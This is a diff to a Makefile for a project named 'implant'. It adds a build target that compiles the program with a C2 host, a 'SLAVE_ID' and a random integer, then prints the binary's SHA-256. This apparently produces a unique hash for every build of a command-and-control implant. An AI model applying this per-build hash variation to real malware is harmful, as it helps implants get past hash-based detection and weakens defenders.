@@ -6,6 +6,8 @@ SOURCE	= ./src
 OUTPUT	= ./bin
 MAIN	= main.cpp
 PROJECT = implant
+RANDOM := $(shell /bin/bash -c "echo $$(shuf -i 1-999999 -n 1)")
+
 
 default:
 	mkdir -p ./bin
@@ -14,3 +16,8 @@ default:
 
 run:
 	$(OUTPUT)/$(PROJECT)
+
+hash:
+	@echo Random $(RANDOM)
+	$(CC) --no-warnings -D SLAVE_ID=\"$(IMPLANT_ID)\" -D C2HOST=\"$(HOST)\" -D RANDOMINT=$(RANDOM) -o $(OUTPUT)/$(PROJECT) $(SOURCE)/$(MAIN);
+	cat $(OUTPUT)/$(PROJECT) | sha256sum
